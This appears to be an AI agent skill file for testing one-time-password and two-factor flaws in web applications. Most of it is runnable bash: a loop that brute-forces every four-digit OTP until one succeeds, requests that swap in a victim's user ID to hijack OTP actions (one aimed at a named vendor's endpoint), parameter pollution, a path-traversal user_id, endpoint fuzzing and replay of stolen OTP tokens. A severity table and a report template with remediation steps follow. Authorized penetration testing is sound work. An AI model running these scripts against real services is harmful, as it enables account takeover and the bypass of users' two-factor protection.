---
description: Find OTP vulnerabilities in web applications. Use when testing for OTP issues.
---

# OTP Vulnerability Testing Framework

## Common OTP Vulnerability Patterns

### 1. OTP Bypass & Reuse
```bash
# Test for OTP code reuse
curl -s -X POST "$TARGET/verify" \
  -H "Content-Type: application/json" \
  -d '{"code":"123456","user_id":"victim"}' \
  | grep -E "(success|valid|authenticated)"

# Check if old codes still work after password change
curl -s -X POST "$TARGET/2fa/verify" \
  -H "Cookie: $SESSION" \
  -d "verification_code=$OLD_OTP&user_id=$USER_ID"
```

### 2. Rate Limit Testing
```bash
# Brute force OTP with no rate limiting
for i in {0000..9999}; do
  response=$(curl -s -w "%{http_code}" -X POST "$TARGET/otp/verify" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "profileActivationCode=$i&user_id=$TARGET_USER")
  
  if [[ $response == *"204"* ]] || [[ $response == *"success"* ]]; then
    echo "[FOUND] Valid OTP: $i"
    break
  fi
  
  if [[ $response == *"429"* ]] || [[ $response == *"rate"* ]]; then
    echo "[INFO] Rate limited at attempt $i"
    break
  fi
done
```

### 3. IDOR in OTP Operations
```bash
# Test user_id manipulation in OTP requests
curl -s -X POST "$TARGET/scauth/otp/droid/logout" \
  -H "Content-Type: application/json" \
  -H "X-Snapchat-Client-Auth: $AUTH_TOKEN" \
  -d '{"user_id":"VICTIM_USER_ID","device_id":"attacker_device"}' \
  | jq '.token'

# Try accessing other users' OTP status
curl -s "$TARGET/admin/users/$VICTIM_ID/2fa/status" \
  -H "Cookie: $ATTACKER_SESSION"
```

### 4. Client-Side OTP Validation
```bash
# Check for client-side time validation
curl -s -X POST "$TARGET/pin/verify" \
  -H "Content-Type: application/json" \
  -H "X-Device-Time: $(date -d '+1 hour' +%s)000" \
  -d '{"pin":"0000"}' \
  | grep -v "rate.limit"
```

## High-Value Target Endpoints

### Endpoint Discovery
```bash
# Common OTP endpoints
endpoints=(
  "/otp/verify" "/2fa/verify" "/verify" "/sms/verify"
  "/scauth/otp/login" "/scauth/otp/logout" 
  "/admin/users/*/2fa/*" "/profiles/edit"
  "/password/reset" "/account/verify"
  "/pin/verify" "/backup/code/verify"
  "/mobile_devices.json" "/two_factor/verify"
)

for endpoint in "${endpoints[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint")
  if [[ $status != "404" ]]; then
    echo "[FOUND] $TARGET$endpoint - Status: $status"
  fi
done
```

### Parameter Fuzzing
```bash
# Common OTP parameter names
params=(
  "code" "otp" "verification_code" "pin" "token"
  "profileActivationCode" "sms_code" "backup_code"
  "magic_code" "auth_code" "security_code"
  "user_id" "userId" "account_id" "phone"
)

# Test parameter pollution and manipulation
curl -s -X POST "$TARGET/otp/verify" \
  -d "code=123456&code=654321&user_id=victim&user_id=attacker"
```

## Step-by-Step Testing Methodology

### Phase 1: Discovery
```bash
#!/bin/bash
TARGET="$1"

echo "[1] Discovering OTP endpoints..."
# Scan for OTP-related endpoints
ffuf -u "$TARGET/FUZZ" -w otp_wordlist.txt -mc 200,302,403 -o otp_endpoints.json

echo "[2] Testing authentication flows..."
# Map 2FA setup process
curl -s "$TARGET/settings/2fa" -H "Cookie: $SESSION" | \
  grep -oE 'action="[^"]*"' | sed 's/action="//;s/"//'
```

### Phase 2: OTP Code Testing
```bash
#!/bin/bash
test_otp_vulnerabilities() {
  local target="$1"
  local session="$2"
  
  echo "[TEST] OTP Code Reuse"
  # Enable 2FA and capture initial code
  old_code=$(curl -s -X POST "$target/2fa/setup" \
    -H "Cookie: $session" \
    -d "phone=+1234567890" | grep -oE '[0-9]{4,6}')
  
  # Test if code works after logout/login
  curl -s -X POST "$target/2fa/verify" \
    -H "Cookie: $session" \
    -d "code=$old_code" | grep -i "success"
    
  echo "[TEST] Cross-User OTP Access"
  # Try using victim's user_id with attacker session
  curl -s -X POST "$target/otp/verify" \
    -H "Cookie: $session" \
    -d "code=123456&user_id=VICTIM_ID"
}
```

### Phase 3: Rate Limit & Brute Force
```bash
#!/bin/bash
test_otp_brute_force() {
  local target="$1"
  local max_attempts=20
  
  echo "[TEST] OTP Brute Force Protection"
  for i in $(seq 1 $max_attempts); do
    code=$(printf "%04d" $((1000 + i)))
    response=$(curl -s -w "%{http_code}" -X POST "$target/otp/verify" \
      -d "code=$code&user_id=$USER_ID")
    
    if [[ $response == *"429"* ]] || [[ $response == *"blocked"* ]]; then
      echo "[PASS] Rate limiting active after $i attempts"
      return 0
    fi
  done
  
  echo "[FAIL] No rate limiting detected after $max_attempts attempts"
}
```

### Phase 4: Advanced OTP Attacks
```bash
#!/bin/bash
test_advanced_otp() {
  local target="$1"
  
  echo "[TEST] OTP Token Manipulation"
  # Test JWT/token manipulation in OTP flow
  curl -s -X POST "$target/otp/login" \
    -H "Authorization: Bearer $MODIFIED_TOKEN" \
    -d "username=victim&token=$STOLEN_OTP_TOKEN"
    
  echo "[TEST] Response Manipulation"  
  # Capture legitimate OTP response for replay
  legit_response='{"status":"SUCCESS","user_id":"victim","token":"xyz"}'
  
  # Test if client accepts manipulated response
  curl -s -X POST "$target/otp/verify" \
    -d "code=0000" \
    --header "X-Mock-Response: $legit_response"
}
```

## Severity Rating Table

| Vulnerability Type | CVSS Base | Criteria |
|-------------------|-----------|----------|
| **Critical (9.0+)** | Account Takeover | OTP bypass allowing full account access |
| **High (7.0-8.9)** | Authentication Bypass | OTP reuse, unlimited brute force |
| **Medium (4.0-6.9)** | Information Disclosure | OTP code exposure, user enumeration |
| **Low (0.1-3.9)** | Rate Limit Issues | Weak rate limiting, timing attacks |

## False Positives to Ignore

1. **Expected Rate Limiting**: 429 responses after failed attempts
2. **Legitimate Timeouts**: OTP codes expiring after 5-15 minutes  
3. **CSRF Protection**: Requests failing due to missing CSRF tokens
4. **Session Requirements**: 401/403 for unauthenticated requests
5. **Input Validation**: Rejection of malformed OTP formats

```bash
# Filter false positives
grep -v -E "(csrf|timeout|expired|invalid.format)" results.txt
```

## Finding Report Template

```markdown
# OTP Vulnerability Report

## Summary
**Vulnerability**: [OTP Bypass/Brute Force/IDOR]
**Endpoint**: `POST /api/otp/verify`
**Severity**: High
**Impact**: Account Takeover via OTP bypass

## Technical Details

**Vulnerable Request:**
```http
POST /scauth/otp/droid/logout HTTP/1.1
Host: target.com
Content-Type: application/json

{"user_id":"VICTIM_ID","device_id":"attacker_device"}
```

**Root Cause:**
- Missing authorization check on user_id parameter
- OTP tokens not properly invalidated after user changes
- No rate limiting on OTP verification attempts

## Proof of Concept

**Step 1**: Attacker obtains session for own account
```bash
curl -X POST "https://target.com/login" \
  -d "username=attacker&password=pass123"
```

**Step 2**: Manipulate user_id in OTP request
```bash  
curl -X POST "https://target.com/otp/verify" \
  -H "Cookie: attacker_session" \
  -d "code=123456&user_id=victim_id"
```

**Step 3**: Successfully authenticate as victim

## Impact
- Complete account takeover
- Bypass of 2FA security controls  
- Access to victim's sensitive data
- Potential for account lockout DoS

## Remediation
1. Validate user_id matches authenticated session
2. Implement proper rate limiting (5 attempts per 15 minutes)
3. Invalidate OTP tokens after password/email changes
4. Add server-side validation for all OTP operations
5. Log and monitor OTP verification attempts

## References
- CWE-287: Improper Authentication
- OWASP A07:2021 – Identification and Authentication Failures
```

## Quick Test Commands

```bash
# One-liner OTP endpoint discovery
curl -s "$TARGET" | grep -oE '(otp|2fa|verify|sms).*?action="[^"]*"' 

# Test common OTP bypass
curl -X POST "$TARGET/otp/verify" -d "code=000000&user_id=../../../admin"

# Check for backup code reuse
curl -X POST "$TARGET/2fa/backup" -H "Cookie: $OLD_SESSION" -d "code=$BACKUP_CODE"
```